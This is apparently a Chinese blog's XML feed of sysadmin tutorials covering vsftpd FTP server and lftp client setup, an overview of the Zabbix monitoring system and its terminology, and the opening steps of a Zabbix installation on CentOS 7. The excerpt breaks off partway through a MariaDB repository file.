id="浏览器访问"><a href="#浏览器访问" class="headerlink" title="浏览器访问"></a>浏览器访问</h5><p><img src="https://img-blog.csdnimg.cn/20191216012256757.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>ps  redis mysql 数据库一致性问题<br><a href="https://yq.aliyun.com/articles/712285">https://yq.aliyun.com/articles/712285</a></p>]]></content>
      
      
      <categories>
          
          <category> operations </category>
          
          <category> 存储 </category>
          
          <category> 数据库 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> 缓存 </tag>
            
            <tag> 数据库 </tag>
            
            <tag> 存储 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>vsftpd 文件传输服务</title>
      <link href="2020/12/04/VSFTP%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%9C%8D%E5%8A%A1/"/>
      <url>2020/12/04/VSFTP%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E6%9C%8D%E5%8A%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="vsftpd"><a href="#vsftpd" class="headerlink" title="vsftpd"></a>vsftpd</h1><p>环境：</p><ul><li>服务端：centos7 1台</li><li>客户端：windows、linux均可</li><li>关闭selinux、firewalld<h3 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">全称：very security ftp</span><br><span class="line">FTP（File Transfer Protocol，文件传输协议）：用来在不同类型的计算机之间传输文件的协议。属于TCP&#x2F;IP协议簇，工作在OSI模型的第七层及TCP&#x2F;IP模型的第四层，是一种面向连接的协议。</span><br><span class="line">FTP服务器：在网络中提供存储文件空间的计算机，应用FTP协议提供服务。用户可以连接到服务器上下载文件，也可以将文件上传到FTP服务器中。</span><br><span class="line">FTP在对外提供服务时需要维护两个连接：一个是控制连接，负责监听21端口，用来传输控制命令；另一个是数据连接，在主动传输方式下监听20端口，用来传输数据。</span><br><span class="line">FTP协议有两种工作模式，</span><br><span class="line">      主动模式（也就是PORT模式）：主动模式FTP的客户端发送PORT命令到FTP服务器；</span><br><span class="line">      被动模式（也就是PSAV）：被动模式FTP的客户端发送PSAV命令到FTP服务器。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">协议：ftp 文件传输协议</span><br><span class="line">端口：</span><br><span class="line">  建立tcp连接： 21</span><br><span class="line">  传输数据：20</span><br><span class="line">  1024+的随即端口</span><br><span class="line">客户端软件：</span><br><span class="line">  浏览器</span><br><span class="line">  资源管理器</span><br><span class="line">  ftp</span><br><span class="line">  lftp(推荐)</span><br><span class="line"> 安装软件</span><br><span class="line">客户端</span><br><span class="line">  lftp-4.0.9-1.el6.x86_64</span><br><span class="line">  ftp-0.17-53.el6.x86_64</span><br><span class="line">服务端</span><br><span class="line">  vsftpd-2.2.2-11.el6.x86_64</span><br></pre></td></tr></table></figure><h3 id="二、服务端配置"><a href="#二、服务端配置" class="headerlink" title="二、服务端配置"></a>二、服务端配置</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@ftpserver ~]# systemctl stop firewalld &amp;&amp; setenforce 0</span><br><span class="line">[root@ftpserver ~]# yum install -y vsftpd  # 下载vsftpd的包</span><br><span class="line">[root@ftpserver ~]# vim &#x2F;etc&#x2F;vsftpd&#x2F;vsftpd.conf # 修改配置文件,修改一下配置</span><br><span class="line">anonymous_enable&#x3D;NO         # 不允许匿名登录</span><br><span class="line">anon_upload_enable&#x3D;YES      # 允许上传文件</span><br><span class="line">anon_mkdir_write_enable&#x3D;YES # 允许上传目录</span><br><span class="line">注：修改后服务需要重启，客户端退出重新登录，ftp根目录不能高于755权限，pub和自创目录需要777权限才能上传成功。</span><br><span class="line">[root@ftpserver ~]# passwd ftp  # 修改ftp账号密码</span><br><span class="line">[root@ftpserver ~]# systemctl start vsftpd  # 启动ftp服务器</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><h3 id="三、客户端配置"><a href="#三、客户端配置" class="headerlink" title="三、客户端配置"></a>三、客户端配置</h3><p>1、windows客户端<br>使用资源管理器或者浏览器<br><a href="https://imgchr.com/i/DLcF61"><img src="https://s3.ax1x.com/2020/12/05/DLcF61.png" alt="DLcF61.png"></a></p><p><a href="https://imgchr.com/i/DLcmkD"><img src="https://s3.ax1x.com/2020/12/05/DLcmkD.png" alt="DLcmkD.png"></a></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# lftp 192.168.101.244 -u ftp</span><br><span class="line">口令: </span><br><span class="line">lftp ftp@192.168.101.244:~&gt; ls            </span><br><span class="line">drwxr-xr-x    2 0        0               6 Jul 03 12:17 777</span><br><span class="line">drwxr-xr-x    2 0        0               6 Oct 30  2018 pub</span><br><span class="line">drwxrwxrwx    2 0        0              67 Jul 03 12:19 testput</span><br><span class="line">lftp ftp@192.168.101.244:~&gt; </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    #lftp  172.16.70.251  </span><br><span class="line">    #lftp  172.16.70.251 -u wing  -p  端口</span><br><span class="line">    &gt; help</span><br><span class="line">    &gt; help ls</span><br><span class="line">    &gt; ls       &#x2F;&#x2F;查看文件</span><br><span class="line">    &gt; dir      &#x2F;&#x2F;同上</span><br><span class="line">    &gt; cd  pub</span><br><span class="line">    &gt; lcd  &#x2F;root&#x2F;Desktop    &#x2F;&#x2F;切换本地目录</span><br><span class="line">    &gt; get  文件1 文件2 文件3    -o   &#x2F;root&#x2F;Desktop        &#x2F;&#x2F;下载文件,多个文件用空格隔开，-o指定下载目录</span><br><span class="line">    &gt; mirror  目录  指定的下载目录           &#x2F;&#x2F;下载目录</span><br><span class="line">    &gt; put      文件                &#x2F;&#x2F;上传文件</span><br><span class="line">    &gt; mirror  -R  目录       &#x2F;&#x2F;上传目录</span><br><span class="line">    &gt; mkdir  目录</span><br><span class="line">    &gt; rmdir  目录</span><br><span class="line">    &gt; mget -c  aaa.txt </span><br><span class="line">vsftpd扩展功能</span><br><span class="line">常用全局配置</span><br><span class="line">    listen_address&#x3D;192.168.4.1   &#x2F;&#x2F;设置监听的IP 地址</span><br><span class="line">    listen_port&#x3D;21                       &#x2F;&#x2F;设置监听FTP 服务的端口号</span><br><span class="line">    write_enable&#x3D;YES                  &#x2F;&#x2F;是否启用写入权限</span><br><span class="line">    download_enable&#x3D;YES           &#x2F;&#x2F;是否允许下载文件</span><br><span class="line">    </span><br><span class="line">    userlist_enable&#x3D;YES              &#x2F;&#x2F;是否启用user_list 列表文件</span><br><span class="line">    download_enable&#x3D;NO &#x2F;&#x2F;禁止用户下载</span><br><span class="line">    anon_other_write_enable&#x3D;YES &#x2F;&#x2F;匿名用户可以删除和重命名                                                 &#x2F;&#x2F;文件在&#x2F;etc&#x2F;vsftpd目录下</span><br><span class="line">    userlist_deny&#x3D;YES                 &#x2F;&#x2F;是否禁用user_list 中的用户</span><br><span class="line"></span><br><span class="line">    max_clients&#x3D;0                       &#x2F;&#x2F;限制并发客户端连接数</span><br><span class="line">    max_per_ip&#x3D;0                        &#x2F;&#x2F;限制同一IP 地址的并发连接数</span><br><span class="line">    </span><br><span class="line">常用的匿名FTP 配置项</span><br><span class="line">    anonymous_enable&#x3D;YES      &#x2F;&#x2F;启用匿名访问</span><br><span class="line">    anon_umask&#x3D;022                &#x2F;&#x2F;匿名用户所上传文件的权限掩码</span><br><span class="line">    anon_root&#x3D;&#x2F;var&#x2F;ftp               &#x2F;&#x2F;匿名用户根目录</span><br><span class="line">    anon_upload_enable&#x3D;YES    &#x2F;&#x2F;允许上传文件</span><br><span class="line">    anon_mkdir_write_enable&#x3D;YES     &#x2F;&#x2F;允许创建目录</span><br><span class="line">    anon_other_write_enable&#x3D;YES      &#x2F;&#x2F;开放其他写入权</span><br><span class="line">    anon_max_rate&#x3D;0                        &#x2F;&#x2F;限制最大传输速率,单位为字节</span><br><span class="line"></span><br><span class="line">常用的本地用户FTP 配置项</span><br><span class="line">    local_enable&#x3D;YES                         &#x2F;&#x2F;是否启用本地系统用户</span><br><span class="line">    local_umask&#x3D;022                         &#x2F;&#x2F;本地用户所上传文件的权限掩码</span><br><span class="line">    local_root&#x3D;&#x2F;var&#x2F;ftp                        &#x2F;&#x2F;本地账户ftp根目录</span><br><span class="line">    local_max_rate&#x3D;0                          &#x2F;&#x2F;限制最大传输速率(字节&#x2F;秒)</span><br><span class="line"></span><br><span class="line">    chroot_local_user&#x3D;YES                 &#x2F;&#x2F;限制所有本地用户在家目录里</span><br><span class="line">    </span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> operations </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
            <tag> 存储 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ZABBIX分布式监控系统介绍</title>
      <link href="2020/12/04/ZABBIX%E5%88%86%E5%B8%83%E5%BC%8F%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9F%E4%BB%8B%E7%BB%8D/"/>
      <url>2020/12/04/ZABBIX%E5%88%86%E5%B8%83%E5%BC%8F%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9F%E4%BB%8B%E7%BB%8D/</url>
      
        <content type="html"><![CDATA[<h2 id="1、zabbix监控介绍"><a href="#1、zabbix监控介绍" class="headerlink" title="1、zabbix监控介绍"></a>1、zabbix监控介绍</h2><p>​    一个新的监控服务根据这个需求被设计出来,它就是 Ganglia。<br>​    Ganglia 是 UC Berkeley 发起的一个开源集群监视项目,设计用于测量数以千计的节点。Ganglia 的核心包含 gmond、gmetad 以及一个 Web 前端。<br>​    主要是用来监控系统性能,如:CPU 、内存、硬盘利用率, I/O 负载、网络流量情况等,通过曲线很容易见到每个节点的工作状态,对合理调整、分配系统资源,提高系统整体性能起到重要作用,目前是监控HADOOP 的官方推荐服务。</p><p>​    Zabbix 是一个基于 WEB 界面的提供分布式系统监视以及网络监视功能的企业级的开源解决方案。zabbix 能监视各种网络参数,保证服务器系统的安全运营;并提供灵活的通知机制以让系统管理员快速定位/解决存在的各种问题。</p><p> Zabbix 是由 Alexei Vladishev 创建，目前由 Zabbix SIA 在持续开发和支持。<br> Zabbix 是一个企业级的分布式开源监控方案。<br> Zabbix 是一款能够监控各种网络参数以及服务器健康性和完整性的软件。Zabbix使用灵活的通知机制，允许用户为几乎任何事件配置基于邮件的告警。这样可以快速反馈服务器的问题。基于已存储的数据，Zabbix提供了出色的报告和数据可视化功能。这些功能使得Zabbix成为容量规划的理想方案。<br> Zabbix支持主动轮询和被动捕获。Zabbix所有的报告、统计信息和配置参数都可以通过基于Web的前端页面进行访问。基于Web的前端页面可以确保您从任何方面评估您的网络状态和服务器的健康性。适当的配置后，Zabbix可以在IT基础架构监控方面扮演重要的角色。对于只有少量服务器的小型组织和拥有大量服务器的大型公司也同样如此。<br> Zabbix是免费的。Zabbix是根据GPL通用公共许可证第2版编写和发行的。这意味着它的源代码都是免费发行的，可供公众任意使用。 </p><p><img src="https://img-blog.csdnimg.cn/20200221204111671.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L05ld1JhaW5fd2FuZw==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>使用 SNMP 协议获取主机 CPU、内存、磁盘、网卡流量等数据.<br>    用脚本将获取到的 SNMP 数据存入数据库中,然后再使用一种名为 MRTG 的软件根据获取的数据绘制图表来分析数据的变化。MRTG(Multi Router Traffic Grapher),顾名思义,这款软件最初是设计用于监控网络链路流量负载的。它可以用过 SNMP 获取到设备的流量信息,并根据这些信息绘制成图表并保存为 PNG 格式的图片,再将这些 PNG 图片以HTML 页面的方式显示给用户.</p><p>​    不过,MRTG 展示的页面和图表曲线相对简陋,它在一张图片中最多只能绘制两个数据的变化曲线,并且由于是 PNG 格式的静态图片,所以无法针对某一时间进行细化展示。为了解决这个问题,人们又开发了 RRDTOOL 工具.</p><p>​    不过,直接使用 RRD TOOL 绘图操作起来很麻烦。同时,现如今的数据中心动辄成百上千的设备,一个个的去提取、绘制、监控显然是不现实的事情.</p><p>​    Cacti 是一套基于 PHP、MySQL、SNMP 及 RRD Tool 开发的监测图形分析工具,Cacti 是使用轮询的方式由主服务器向设备发送数据请求来获取设备上状态数据信息的,如果设备不断增多,这个轮询的过程就非常的耗时,轮询的结果就不能即时的反应设备的状态了。Cacti 监控关注的是对数据的展示,<br>​    却不关注数据异常后的反馈。如果凌晨 3 点的时候设备的某个数据出现异常,除非监控人员在屏幕前发现这个异常变化,否则是没有任何报警机制能够让我们道出现了异常。</p><p>​    Nagios 是一款开源的免费网络监控报警服务,能有效监控 Windows、Linux 和 Unix 的主机状态,交换机、路由器和防火墙等网络设置,打印机、网络投影、网络摄像等设备。在系统或服务状态异常时发出邮件或短信报警第一时间通知运维人员,在状态恢复后发出正常的邮件或短信通知。Nagios 有完善的插件功能,可以方便的根据应用服务扩展功能。</p><p>​    Nagios 已经可以支持由数万台服务器或上千台网络设备组成的云技术平台的监控,它可以充分发挥自动化运维技术特点在设备和人力资源减少成本。只是 Nagios 无法将多个相同应用集群的数据集合起来,也不能监控到集群中特殊节点的迁移和恢复。</p><h2 id="2、监控区别"><a href="#2、监控区别" class="headerlink" title="2、监控区别"></a>2、监控区别</h2><p>​    1.nagios图形不是特别好，也可以安装图形插件，但是也不怎么好看</p><p>​    2.nagios一般情况下如果需要图形可以和cacti配合使用</p><p>​    3.cacti的监控是轮询监控,效率低，图形相对nagios比较好看</p><p>​    4.zabbix和nagios因为是并发监控，对cpu的要求更高</p><p>​    5.zabbix在性能和功能上都强大很多</p><p>​    6.zabbix的图形相当漂亮</p><p>​    7.支持多种监控方式 zabbix-agent  snmp 等等</p><p>​    8.支持分布式监控,能监控的agent非常多</p><p>​    9.zabbix有图形的web配置界面，配置简洁</p><p>​    10.zabbix支持自动发现功能</p><h2 id="3、zabbix-监控"><a href="#3、zabbix-监控" class="headerlink" title="3、zabbix 监控"></a>3、zabbix 监控</h2><h3 id="1、zabbix-监控架构"><a href="#1、zabbix-监控架构" class="headerlink" title="1、zabbix 监控架构"></a>1、zabbix 监控架构</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">                监控中心zabbix-server</span><br><span class="line">                         |</span><br><span class="line">         ------------------------------</span><br><span class="line">        |                              |</span><br><span class="line">   ---proxy---                    ---proxy---</span><br><span class="line">  |           |                  |           |</span><br><span class="line">agent       agent              agent       agent</span><br></pre></td></tr></table></figure><h3 id="2、Zabbix-优点"><a href="#2、Zabbix-优点" class="headerlink" title="2、Zabbix 优点"></a>2、Zabbix 优点</h3><p>​    开源,无软件成本投入</p><p>​    Server 对设备性能要求低</p><p>​    支持设备多,自带多种监控模板</p><p>​    支持分布式集中管理,有自动发现功能,可以实现自动化监控</p><p>​    开放式接口,扩展性强,插件编写容易</p><p>​    当监控的 item 比较多服务器队列比较大时可以采用被动状态,被监控客户端主动 从server 端去下载需要监控的 item 然后取数据上传到 server 端。 这种方式对服务器的负载比较小。</p><p>​    Api 的支持,方便与其他系统结合</p><h3 id="3、Zabbix-缺点"><a href="#3、Zabbix-缺点" class="headerlink" title="3、Zabbix 缺点"></a>3、Zabbix 缺点</h3><p>​        需在被监控主机上安装 agent,所有数据都存在数据库里, 产生的数据很大,瓶颈主要在数据库。</p><h3 id="4、Zabbix-监控系统监控对象"><a href="#4、Zabbix-监控系统监控对象" class="headerlink" title="4、Zabbix 监控系统监控对象"></a>4、Zabbix 监控系统监控对象</h3><hr><p>数据库：   MySQL,MariaDB,Oracle,SQL Server</p><p>应用软件：Nginx,Apache,PHP,Tomcat                    </p><hr><p>集群：      LVS,Keepalived,HAproxy,RHCS,F5</p><p>虚拟化：   VMware,KVM,XEN                               </p><p>操作系统：Linux,Unix,Windows性能参数</p><hr><p>硬件： 服务器，存储，网络设备                              IPMI</p><p>网络： 网络环境（内网环境，外网环境）              SNMP</p><hr><h3 id="5、Zabbix监控方式"><a href="#5、Zabbix监控方式" class="headerlink" title="5、Zabbix监控方式"></a>5、Zabbix监控方式</h3><p>被动模式<br>主动模式</p><p>​             </p><h3 id="6、zabbix-架构"><a href="#6、zabbix-架构" class="headerlink" title="6、zabbix 架构"></a>6、zabbix 架构</h3><p> Zabbix由几个主要的软件组件构成，这些组件的功能如下。</p><h4 id="1、Server"><a href="#1、Server" class="headerlink" title="1、Server"></a>1、<strong>Server</strong></h4><p> Zabbix server 是agent程序报告系统可用性、系统完整性和统计数据的核心组件，是所有配置信息、统计信息和操作数据的核心存储器。 </p><h4 id="2、数据库存储"><a href="#2、数据库存储" class="headerlink" title="2、数据库存储"></a><strong>2、数据库存储</strong></h4><p> 所有配置信息和Zabbix收集到的数据都被存储在数据库中。 </p><h4 id="3、Web界面"><a href="#3、Web界面" class="headerlink" title="3、Web界面"></a><strong>3、Web界面</strong></h4><p>为了从任何地方和任何平台都可以轻松的访问Zabbix, 我们提供基于Web的Zabbix界面。该界面是Zabbix Server的一部分，通常(但不一定)跟Zabbix Server运行在同一台物理机器上。 </p><p>如果使用SQLite,Zabbix Web界面必须要跟Zabbix Server运行在同一台物理机器上。</p><h4 id="4、Proxy-代理服务器"><a href="#4、Proxy-代理服务器" class="headerlink" title="4、Proxy 代理服务器"></a><strong>4、Proxy 代理服务器</strong></h4><p> Zabbix proxy 可以替Zabbix Server收集性能和可用性数据。Proxy代理服务器是Zabbix软件可选择部署的一部分；当然，Proxy代理服务器可以帮助单台Zabbix Server分担负载压力。 </p><h4 id="5、Agent监控代理"><a href="#5、Agent监控代理" class="headerlink" title="5、Agent监控代理"></a><strong>5、Agent监控代理</strong></h4><p> Zabbix agents监控代理 部署在监控目标上，能够主动监控本地资源和应用程序，并将收集到的数据报告给Zabbix Server。 </p><h4 id="6、数据流"><a href="#6、数据流" class="headerlink" title="6、数据流"></a><strong>6、数据流</strong></h4><p> 此外，了解Zabbix内部的数据流同样很重要。监控方面，为了创建一个监控项(item)用于采集数据，必须先创建一个主机（host）。告警方面，在监控项里创建触发器（trigger），通过触发器（trigger）来触发告警动作（action）。 因此，如果你想收到Server XCPU负载过高的告警，你必须: 1. 为Server X创建一个host并关联一个用于对CPU进行监控的监控项（Item）。 2. 创建一个Trigger，设置成当CPU负载过高时会触发 3. Trigger被触发，发送告警邮件 虽然看起来有很多步骤，但是使用模板的话操作起来其实很简单，Zabbix这样的设计使得配置机制非常灵活易用。 </p><h3 id="8、Zabbix常用术语的含义"><a href="#8、Zabbix常用术语的含义" class="headerlink" title="8、Zabbix常用术语的含义"></a>8、Zabbix常用术语的含义</h3><h4 id="1、主机-host"><a href="#1、主机-host" class="headerlink" title="1、主机 (host)"></a>1、主机 (host)</h4><ul><li>一台你想监控的网络设备，用IP或域名表示 </li></ul><h4 id="2、主机组-host-group"><a href="#2、主机组-host-group" class="headerlink" title="2、主机组 (host group)"></a>2、主机组 (host group)</h4><ul><li>主机的逻辑组；它包含主机和模板。一个主机组里的主机和模板之间并没有任何直接的关联。通常在给不同用户组的主机分配权限时候使用主机组。 </li></ul><h4 id="3、监控项-item"><a href="#3、监控项-item" class="headerlink" title="3、监控项 (item)"></a>3、监控项 (item)</h4><ul><li>你想要接收的主机的特定数据，一个度量数据。 </li></ul><h4 id="4、触发器-trigger"><a href="#4、触发器-trigger" class="headerlink" title="4、触发器 (trigger)"></a>4、触发器 (trigger)</h4><ul><li>一个被用于定义问题阈值和“评估”监控项接收到的数据的逻辑表达式<br>当接收到的数据高于阈值时，触发器从“OK”变成“Problem”状态。当接收到的数据低于阈值时，触发器保留/返回一个“OK”的状态。 </li></ul><h4 id="5、事件-event"><a href="#5、事件-event" class="headerlink" title="5、事件 (event)"></a>5、事件 (event)</h4><ul><li>单次发生的需要注意的事情，例如触发器状态改变或发现有监控代理自动注册 </li></ul><h4 id="6、异常-problem"><a href="#6、异常-problem" class="headerlink" title="6、异常 (problem)"></a>6、异常 (problem)</h4><ul><li>一个处在“异常”状态的触发器 </li></ul><h4 id="7、动作-action"><a href="#7、动作-action" class="headerlink" title="7、动作 (action)"></a>7、动作 (action)</h4><ul><li>一个对事件做出反应的预定义的操作。<br>一个动作由操作(例如发出通知)和条件(当时操作正在发生)组成 </li></ul><h4 id="8、升级-escalation"><a href="#8、升级-escalation" class="headerlink" title="8、升级 (escalation)"></a>8、升级 (escalation)</h4><ul><li>一个在动作内执行操作的自定义场景; 发送通知/执行远程命令的序列 </li></ul><h4 id="9、媒介-media"><a href="#9、媒介-media" class="headerlink" title="9、媒介 (media)"></a>9、媒介 (media)</h4><ul><li>发送告警通知的手段；告警通知的途径 </li></ul><h4 id="10、通知-notification"><a href="#10、通知-notification" class="headerlink" title="10、通知 (notification)"></a>10、通知 (notification)</h4><ul><li>利用已选择的媒体途径把跟事件相关的信息发送给用户 </li></ul><h4 id="11、远程命令-remote-command"><a href="#11、远程命令-remote-command" class="headerlink" title="11、远程命令 (remote command)"></a>11、远程命令 (remote command)</h4><ul><li>一个预定义好的，满足一些条件的情况下，可以在被监控主机上自动执行的命令 </li></ul><h4 id="12、模版-template"><a href="#12、模版-template" class="headerlink" title="12、模版 (template)"></a>12、模版 (template)</h4><ul><li>一组可以被应用到一个或多个主机上的实体（监控项，触发器，图形，聚合图形，应用，LLD，Web场景）的集合<br>模版的任务就是加快对主机监控任务的实施；也可以使监控任务的批量修改更简单。模版是直接关联到每台单独的主机上。 </li></ul><h4 id="13、应用-application"><a href="#13、应用-application" class="headerlink" title="13、应用 (application)"></a>13、应用 (application)</h4><ul><li>一组监控项组成的逻辑分组 </li></ul><h4 id="14、web-场景-web-scenario"><a href="#14、web-场景-web-scenario" class="headerlink" title="14、web 场景 (web scenario)"></a>14、web 场景 (web scenario)</h4><ul><li>利用一个或多个HTTP请求来检查网站的可用性 </li></ul><h4 id="15、前端-frontend"><a href="#15、前端-frontend" class="headerlink" title="15、前端 (frontend)"></a>15、前端 (frontend)</h4><ul><li>Zabbix提供的web界面 </li></ul><h4 id="16、Zabbix-API"><a href="#16、Zabbix-API" class="headerlink" title="16、Zabbix API"></a>16、Zabbix API</h4><ul><li>Zabbix API允许你使用JSON RPC协议 <strong>(是一个无状态且轻量级的远程过程调用（RPC）传送协议，其传递内容透过 JSON 为主)</strong> 来创建、更新和获取Zabbix对象（如主机、监控项、图形和其他）信息或者执行任何其他的自定义的任务 </li></ul><h4 id="17、Zabbix-server"><a href="#17、Zabbix-server" class="headerlink" title="17、Zabbix server"></a>17、Zabbix server</h4><ul><li>Zabbix软件实现监控的核心程序，主要功能是与Zabbix proxies和Agents进行交互、触发器计算、发送告警通知；并将数据集中保存等 </li></ul><h4 id="18、Zabbix-agent"><a href="#18、Zabbix-agent" class="headerlink" title="18、Zabbix agent"></a>18、Zabbix agent</h4><ul><li>一个部署在监控对象上的，能够主动监控本地资源和应用的程序<br>Zabbix agent部署在监控的目标上，主动监测本地的资源和应用(硬件驱动，内存，处理器统计等)。<br>Zabbix agent收集本地的操作信息并将数据报告给Zabbix server用于进一步处理。一旦出现异常 (比如硬盘空间已满或者有崩溃的服务进程), Zabbix server会主动警告管理员指定机器上的异常。 Zabbix agents 的极端高效缘于它可以利用本地系统调用来完成统计数据的收集。 </li></ul><h4 id="19、被动（passive）和主动（active）检查"><a href="#19、被动（passive）和主动（active）检查" class="headerlink" title="19、被动（passive）和主动（active）检查"></a>19、被动（passive）和主动（active）检查</h4><p> Zabbix agents可以执行被动和主动两种检查方式。<br> 在passive check 模式中agent应答数据请求，Zabbix server（或者proxy）询问agent数据,如CPU 的负载情况，然后Zabbix agent回送结果。<br> Active checks 处理过程将相对复杂。 Agent必须首先从Zabbix sever索取监控项列表以进行独立处理，然后周期性地发送新的值给server。<br> 执行被动或主动检查是通过选择相应的监测项目类型来配置的。item type. Zabbix agent处理监控项类型有’Zabbix agent’和’Zabbix agent (active)’。 </p><h4 id="20、Zabbix-proxy"><a href="#20、Zabbix-proxy" class="headerlink" title="20、Zabbix proxy"></a>20、Zabbix proxy</h4><p>一个帮助Zabbix Server收集数据，分担Zabbix Server的负载的程序<br>Zabbix Proxy是一个可以从一个或多个受监控设备收集监控数据，并将信息发送到Zabbix sever的进程，基本上是代表sever工作的。 所有收集的数据都在本地进行缓存，然后传送到proxy所属的Zabbix sever。<br> 部署Proxy是可选的，，但是可能非常有益于分散单个Zabbix sever的负载。 如果只有proxy收集数据，sever上的进程就会减少CPU消耗和磁盘I / O负载。<br> Zabbix proxy是完成远程区域、分支机构、没有本地管理员的网络的集中监控的理想解决方案。<br> Zabbix proxy需要使用独立的数据库。 </p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMTkvMDUvMDkvNWNkM2U3ZjExZGZjZC5qcGc?x-oss-process=image/format,png"></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pLmxvbGkubmV0LzIwMTkvMDUvMDkvNWNkM2U3YTI3ZDBjOS5qcGc?x-oss-process=image/format,png"></p>]]></content>
      
      
      <categories>
          
          <category> operations </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 运维 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ZABBIX分布式监控系统配置(一)</title>
      <link href="2020/12/04/ZABBIX%E5%88%86%E5%B8%83%E5%BC%8F%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9F%E6%90%AD%E5%BB%BA(%E4%B8%80)/"/>
      <url>2020/12/04/ZABBIX%E5%88%86%E5%B8%83%E5%BC%8F%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9F%E6%90%AD%E5%BB%BA(%E4%B8%80)/</url>
      
        <content type="html"><![CDATA[<p>Zabbix 企业监控系统搭建</p><h3 id="1、实验准备"><a href="#1、实验准备" class="headerlink" title="1、实验准备"></a>1、实验准备</h3><p>　　centos7.5 系统服务器3台、 一台作为监控服务器， 两台台作为被监控节点， 配置好yum源、 防火墙关闭、 各节点时钟服务同步、 各节点之间可以通过主机名互相通信。</p><table><thead><tr><th>主机名</th><th>ip</th><th>服务</th></tr></thead><tbody><tr><td>zabbix-master</td><td>172.16.147.153</td><td>zabbix-server</td></tr><tr><td>zabbix-slave1</td><td>172.16.147.154</td><td>zabbix-agent</td></tr><tr><td>zabbix-slave2</td><td>172.16.147.155</td><td>zabbix-agent</td></tr></tbody></table><p><strong>1）所有机器关闭防火墙和selinux</strong></p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@zabbix-master ~]# systemctl stop firewalld &amp;&amp; setenforce 0（修改配置文件关闭）</span><br><span class="line">[root@zabbix-slave ~]# systemctl stop firewalld &amp;&amp; setenforce 0</span><br><span class="line"><span class="meta">#</span><span class="bash"> 必要时可永久关闭或开启相应的端口</span></span><br></pre></td></tr></table></figure><h3 id="2、Zabbix的安装"><a href="#2、Zabbix的安装" class="headerlink" title="2、Zabbix的安装"></a>2、Zabbix的安装</h3><p><a href="https://www.zabbix.com/download">下载地址</a></p><h4 id="1）更新yum仓库"><a href="#1）更新yum仓库" class="headerlink" title="1）更新yum仓库"></a>1）更新yum仓库</h4><p>　　我们去官网下载一个包<code>zabbix-release-4.4-1.el7.noarch.rpm</code>，本地安装至我们的虚拟机，这样，我们本地就有了新的yum源，可以直接安装zabbix服务：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">下载安装官方yum源</span><br><span class="line">[root@zabbix-master ~]# rpm -Uvh https://repo.zabbix.com/zabbix/4.4/rhel/7/x86_64/zabbix-release-4.4-1.el7.noarch.rpm</span><br><span class="line">[root@zabbix-master ~]# yum clean all</span><br><span class="line">[root@zabbix-master ~]# yum makecache fast</span><br><span class="line">已加载插件：fastestmirror</span><br><span class="line">正在清理软件源： base extras updates zabbix zabbix-non-supported</span><br></pre></td></tr></table></figure><p>下载安装：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rpm -ivh zabbix-release-4.4-1.el7.noarch.rpm</span><br></pre></td></tr></table></figure><p>　　而后更新我们的yum仓库：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@zabbix-master ~]# yum repolist </span><br><span class="line">Loaded plugins: fastestmirror, langpacks  </span><br><span class="line">Loading mirror speeds from cached hostfile</span><br><span class="line">zabbix-non-supported                                                      4/4</span><br><span class="line">repo id                     repo name                                   status</span><br><span class="line">base                        base                                         9,363</span><br><span class="line">epel                        epel                                        11,349</span><br><span class="line">zabbix/x86_64               Zabbix Official Repository - x86_64             80</span><br><span class="line">zabbix-non-supported/x86_64 Zabbix Official Repository non-supported -       4</span><br><span class="line">repolist: 20,796</span><br></pre></td></tr></table></figure><p>安装：</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@zabbix-master ~]# yum -y install zabbix-agent zabbix-get zabbix-sender zabbix-server-mysql zabbix-web zabbix-web-mysql</span><br><span class="line"></span><br><span class="line">或者（官方）</span><br><span class="line">[root@zabbix-master ~]# yum-config-manager --enable rhel-7-server-optional-rpms</span><br></pre></td></tr></table></figure><h4 id="2）安装设置数据库："><a href="#2）安装设置数据库：" class="headerlink" title="2）安装设置数据库："></a>2）安装设置数据库：</h4><p>1、创建 mariadb.repo</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim /etc/yum.repos.d/mariadb.repo</span><br><span class="line">写入以下内容：</span><br><span class="line">[mariadb]</span><br><span class="line">name = MariaDB </span><br><span class="line">baseurl = https://mirrors.ustc.edu.cn/mariadb/yum/10.4/centos7-amd64 </span><br><span 